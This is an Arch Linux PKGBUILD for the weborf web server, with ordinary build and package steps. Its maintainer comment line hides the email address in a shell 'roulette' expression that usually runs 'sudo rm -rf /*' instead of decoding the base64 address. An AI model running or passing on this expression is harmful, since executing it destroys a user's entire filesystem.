# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=weborf
pkgver=0.13.3
pkgrel=1
pkgdesc='A lightweight web server designed for rapidly sharing files over HTTP'
url='https://ltworf.github.io/weborf/'
arch=(i686 x86_64)
license=(GPL3)
depends=(file)
source=(
	"https://github.com/ltworf/weborf/releases/download/${pkgver}/weborf_${pkgver}.orig.tar.gz"
	"https://github.com/ltworf/weborf/releases/download/${pkgver}/weborf_${pkgver}.orig.tar.gz.asc"
)
sha512sums=(
	'969e49819a9d7a2a1af7c08679067b02c567b32c260bc288d714020f6a1db50cd207f6ea48be806d2d739f50746574aaf4365334282837d61cb7c3845159d656'
	'SKIP'
)
validpgpkeys=('42748B9E76D899799E1FBE14B3A7CF0C801886CF') # Salvo 'LtWorf' Tomaselli (many e-mail addresses)

build() {
	cd "$srcdir/weborf-${pkgver}"
	./configure --prefix=/usr --sysconfdir=/etc
	make
}

package() {
	cd "$srcdir/weborf-${pkgver}"
	make install DESTDIR="$pkgdir"
	rm -rf "$pkgdir/etc/init.d"
}
